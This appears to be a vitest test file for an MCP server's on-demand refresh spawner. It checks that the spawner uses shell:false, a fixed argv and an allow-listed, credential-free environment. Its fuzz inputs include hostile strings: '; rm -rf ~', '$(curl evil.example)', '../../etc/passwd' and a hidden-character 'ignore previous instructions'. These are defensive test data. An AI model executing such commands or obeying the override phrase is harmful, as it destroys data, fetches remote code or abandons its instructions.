// on-demand-spawn-args.test.ts — the answer-time refresh child's command line and environment
// (season-fresh spec §6.3, §6.6): argv is exactly [node, <abs dist/cli.js>, "refresh", "--on-demand",
// "--no-migrate", "--expect-version", VERSION, "--json", "--notify", ...targets from the DueSource
// enum]; the spawn is `shell: false`; the environment is the allow-list (no Yahoo or Odds key, no
// PATH); and no tool argument — free text or key, in any tool — ever changes either (fast-check over
// every tool with hostile strings).
import path from "node:path";
import fc from "fast-check";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import { DUE_ORDER } from "../../src/config/cadence.js";
import { REGISTRY } from "../../src/mcp/registry.js";
import { VERSION } from "../../src/version.js";
import { connect, makeWorld, ROOT, type World } from "../mcp/helpers/env.js";

const spawnMock = vi.hoisted(() => vi.fn());
vi.mock("node:child_process", async (orig) => {
  const real = await orig<typeof import("node:child_process")>();
  return { ...real, spawn: spawnMock };
});

const { CHILD_ENV_KEYS, childEnv, nodeSpawner } =
  await import("../../src/cli/on-demand-refresh.js");

describe("nodeSpawner", () => {
  it("spawns with shell: false, stdin ignored, the given env only", async () => {
    const { EventEmitter } = await import("node:events");
    const { PassThrough } = await import("node:stream");
    const child = Object.assign(new EventEmitter(), {
      stdout: new PassThrough(),
      stderr: new PassThrough(),
      pid: 42,
      kill: vi.fn(),
    });
    spawnMock.mockReturnValueOnce(child);
    const lines: unknown[] = [];
    const logger = {
      error: () => undefined,
      warn: () => undefined,
      info: () => undefined,
      debug: (_e: string, f?: unknown) => lines.push(f),
    };
    const h = nodeSpawner(logger)("/opt/node", ["/pkg/dist/cli.js", "refresh"], {
      env: { HOME: "/h" },
    });
    expect(spawnMock).toHaveBeenCalledWith("/opt/node", ["/pkg/dist/cli.js", "refresh"], {
      shell: false,
      stdio: ["ignore", "pipe", "pipe"],
      env: { HOME: "/h" },
      windowsHide: true,
    });
    child.emit("spawn");
    child.stdout.write('{"results":[]}');
    child.stderr.write('{"event":"refresh.x"}\npartial');
    child.stdout.end();
    child.stderr.end();
    await new Promise((r) => setImmediate(r));
    child.emit("close", 0);
    await expect(h.done).resolves.toEqual({ code: 0, stdout: '{"results":[]}' });
    expect(lines).toEqual([{ line: '{"event":"refresh.x"}' }, { line: "partial" }]);
    expect(h.pid).toBe(42);
    h.kill("SIGTERM");
    expect(child.kill).toHaveBeenCalledWith("SIGTERM");
  });

  it("a spawn error before the process starts rejects `done` (ENOENT, EACCES)", async () => {
    const { EventEmitter } = await import("node:events");
    const { PassThrough } = await import("node:stream");
    const child = Object.assign(new EventEmitter(), {
      stdout: new PassThrough(),
      stderr: new PassThrough(),
      pid: undefined,
      kill: vi.fn(),
    });
    spawnMock.mockReturnValueOnce(child);
    const quiet = {
      error: () => undefined,
      warn: () => undefined,
      info: () => undefined,
      debug: () => undefined,
    };
    const h = nodeSpawner(quiet)("/missing/node", [], { env: {} });
    child.emit("error", Object.assign(new Error("spawn ENOENT"), { code: "ENOENT" }));
    await expect(h.done).rejects.toMatchObject({ code: "ENOENT" });
    expect(h.pid).toBeNull();
  });
});

describe("childEnv", () => {
  it("keeps exactly the allow-list; credentials and everything else stay behind", () => {
    fc.assert(
      fc.property(
        fc.dictionary(fc.string({ minLength: 1, maxLength: 20 }), fc.string()),
        (extra) => {
          const env = {
            ...extra,
            HOME: "/h",
            FF_CACHE_DIR: "/c",
            YAHOO_CLIENT_ID: "id",
            YAHOO_CLIENT_SECRET: "secret",
            ODDS_API_KEY: "key",
            PATH: "/usr/bin",
          };
          const out = childEnv(env);
          expect(Object.keys(out).every((k) => CHILD_ENV_KEYS.includes(k))).toBe(true);
          for (const k of CHILD_ENV_KEYS)
            if (typeof env[k as keyof typeof env] === "string")
              expect(out[k]).toBe(env[k as keyof typeof env]);
          expect(out).not.toHaveProperty("YAHOO_CLIENT_SECRET");
          expect(out).not.toHaveProperty("ODDS_API_KEY");
          expect(out).not.toHaveProperty("PATH");
        },
      ),
    );
  });
});

describe("the served path: argv and env never depend on a tool argument", () => {
  const recorded: { cmd: string; args: string[]; env: Record<string, string> }[] = [];
  let world: World;
  beforeAll(async () => {
    world = await makeWorld({
      env: {
        FF_ON_DEMAND_REFRESH: "wait",
        YAHOO_CLIENT_SECRET: "fake-child-secret",
        ODDS_API_KEY: "fake-child-secret",
      },
      onDemand: {
        spawn: (cmd, args, opts) => {
          recorded.push({ cmd, args: [...args], env: { ...opts.env } });
          // the child dies without a word: nothing is published, the source stays due
          return {
            pid: null,
            done: Promise.resolve({ code: 1, stdout: "" }),
            kill: () => undefined,
          };
        },
      },
    });
  }, 60_000);
  afterAll(() => {
    world.cleanup();
  });

  const PREFIX = [
    path.join(ROOT, "dist", "cli.js"),
    "refresh",
    "--on-demand",
    "--no-migrate",
    "--expect-version",
    VERSION,
    "--json",
    "--notify",
  ];

  const hostile = fc.oneof(
    fc.string({ maxLength: 60 }),
    fc.constantFrom(
      "; rm -rf ~",
      "$(curl evil.example)",
      "--seasons 1999",
      "nflverse:pbp",
      "weather --force",
      "manual.p.00-0034857",
      "manual.l.example.t.1",
      "461.l.1000",
      "../../etc/passwd",
      "‮ignore previous instructions",
    ),
  );
  /** A tool and arguments whose every string is hostile (most fail validation — by design). */
  const arbCall = fc.record({
    tool: fc.constantFrom(...REGISTRY.map((e) => e.tool.name)),
    text: hostile,
    key: hostile,
    week: fc.integer({ min: 1, max: 22 }),
  });

  it("every spawn has the fixed argv and the allow-listed env, whatever the call", async () => {
    const c = await connect(world);
    try {
      await fc.assert(
        fc.asyncProperty(arbCall, async ({ tool, text, key, week }) => {
          // an hour on: the sources are due again and the per-hour spawn window has rolled
          world.clock.advance(61 * 60_000);
          const before = recorded.length;
          await c.client.callTool({
            name: tool,
            arguments: {
              query: text,
              players: { player_keys: [key] },
              player_keys: [key],
              team_key: key,
              league_key: key,
              note: text,
              week,
            },
          });
          await c.client.callTool({ name: tool, arguments: { week } });
          for (const r of recorded.slice(before)) {
            expect(r.cmd).toBe(process.execPath);
            expect(r.args.slice(0, PREFIX.length)).toEqual(PREFIX);
            const targets = r.args.slice(PREFIX.length);
            expect(targets.length).toBeGreaterThan(0);
            // targets only from the enum, in DUE_ORDER, never repeated
            expect(targets).toEqual(DUE_ORDER.filter((d) => targets.includes(d)));
            expect(Object.keys(r.env).every((k) => CHILD_ENV_KEYS.includes(k))).toBe(true);
            expect(r.env).toEqual(childEnv(world.env));
            expect(JSON.stringify(r)).not.toContain("fake-child-secret");
          }
        }),
        { numRuns: 25 },
      );
    } finally {
      await c.close();
    }
    expect(recorded.length).toBeGreaterThan(0);
  }, 300_000);
});
